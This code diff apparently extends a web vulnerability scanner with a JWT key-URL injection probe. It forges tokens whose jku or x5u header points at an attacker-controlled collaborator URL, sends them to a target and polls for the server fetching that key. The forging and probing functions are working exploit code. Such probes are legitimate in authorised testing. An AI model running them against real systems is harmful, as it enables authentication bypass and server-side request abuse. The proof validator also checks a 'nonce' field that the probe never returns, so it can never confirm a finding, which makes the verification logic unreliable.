@@ -293,3 +293,108 @@ def jwt_pair_valid(first: dict, second: dict) -> bool:
         and first.get("recipe") == second.get("recipe")
         and first.get("credential_location") == second.get("credential_location")
     )
+
+
+# --- Key-URL headers (jku / x5u) ------------------------------------------------
+
+KEY_URL_HEADERS = ("jku", "x5u")
+
+
+def forge_key_url(token: str, header_name: str, key_url: str, nonce: str) -> str:
+    """The identity's token with ``jku``/``x5u`` pointing at a fresh collaborator.
+
+    The signature is left as-is (it no longer matches); the proof is that the
+    server fetches the attacker-supplied key URL at all.
+    """
+    if header_name not in KEY_URL_HEADERS:
+        raise ValueError("Unsupported key URL header")
+    header_b64, _payload_b64, signature, header, payload = _decode(token)
+    forged_header = _b64encode(json.dumps({**header, header_name: key_url},
+                                          separators=(",", ":")).encode())
+    body = _b64encode(json.dumps({**payload, "prowl_nonce": nonce},
+                                 separators=(",", ":")).encode())
+    return f"{forged_header}.{body}.{signature}"
+
+
+def probe_jwt_key_url(url: str, *, allowed_origin: str, session: dict, nonce: str,
+                      header_name: str, register, poll, stop, send=_request,
+                      poll_attempts: int = 4, sleep=None) -> dict:
+    """Prove the server dereferences an attacker-supplied ``jku``/``x5u`` URL.
+
+    A freshly registered collaborator URL goes into the token header; an HTTP
+    interaction carrying that registration's id after the request is the
+    signal. DNS alone is not enough (a resolver may look up any hostname).
+    """
+    import time
+
+    if not nonce or len(nonce) < 8 or len(nonce) > 40 or not nonce.isalnum():
+        raise ValueError("A random alphanumeric nonce of at least 8 characters is required")
+    where, name, token = locate_token(session)
+    unauthenticated = send(url, allowed_origin=allowed_origin, session=session,
+                           where=where, name=name, token=None)
+    if unauthenticated[0] not in {401, 403}:
+        return {"operation": "scoped_jwt_probe", "test_type": "jwt", "recipe": "",
+                "key_url_header": header_name, "auth_enforced": False,
+                "proof_confirmed": False, "finding": False, "requests_sent": 1}
+    registration = register()
+    if not registration.get("success"):
+        raise ValueError("Callback registration failed")
+    session_id = str(registration.get("session_id") or "")
+    domain = str(registration.get("payload_domain") or "").lower()
+    payload_url = str(registration.get("payload_url") or "")
+    if not session_id or not domain or not payload_url:
+        raise ValueError("Callback registration returned no domain")
+    key_url = payload_url.rstrip("/") + f"/{header_name}-{nonce}.json"
+    interactions = []
+    try:
+        status, _body = send(url, allowed_origin=allowed_origin, session=session,
+                             where=where, name=name,
+                             token=forge_key_url(token, header_name, key_url, nonce))
+        unique = domain.split(".")[0]
+        for attempt in range(max(1, min(poll_attempts, 8))):
+            if attempt:
+                (sleep or time.sleep)(2.0)
+            polled = poll(session_id) or {}
+            interactions = [
+                {"protocol": str(row.get("protocol") or "").lower(),
+                 "matches": unique in str(row.get("unique_id") or "")}
+                for row in (polled.get("interactions") or []) if isinstance(row, dict)
+            ]
+            if any(row["protocol"] == "http" and row["matches"] for row in interactions):
+                break
+    finally:
+        stop(session_id)
+    fetched = any(row["protocol"] == "http" and row["matches"] for row in interactions)
+    return {
+        "operation": "scoped_jwt_probe", "test_type": "jwt",
+        "recipe": f"{header_name}_fetch" if fetched else "",
+        "key_url_header": header_name, "callback_domain": domain,
+        "key_url_host_matches": key_url.split("/")[2].lower().endswith(domain),
+        "auth_enforced": True, "forged_status": status,
+        "control": {"signal": False, "unauthenticated": {"status": unauthenticated[0]}},
+        "interactions": interactions[:10], "requests_sent": 2,
+        "proof_confirmed": bool(fetched), "finding": False,
+    }
+
+
+def jwt_key_url_proof_valid(row: dict) -> bool:
+    return bool(
+        isinstance(row, dict) and row.get("operation") == "scoped_jwt_probe"
+        and row.get("proof_confirmed") is True
+        and row.get("key_url_header") in KEY_URL_HEADERS
+        and row.get("recipe") == f"{row.get('key_url_header')}_fetch"
+        and row.get("auth_enforced") is True
+        and row.get("key_url_host_matches") is True
+        and (row.get("control") or {}).get("unauthenticated", {}).get("status") in {401, 403}
+        and any(i.get("protocol") == "http" and i.get("matches") for i in row.get("interactions") or [])
+        and len(str(row.get("nonce") or "")) >= 8
+    )
+
+
+def jwt_key_url_pair_valid(first: dict, second: dict) -> bool:
+    """Each actor registered its own collaborator and saw its own fetch."""
+    return bool(
+        jwt_key_url_proof_valid(first) and jwt_key_url_proof_valid(second)
+        and first.get("key_url_header") == second.get("key_url_header")
+        and first.get("callback_domain") != second.get("callback_domain")
+    )
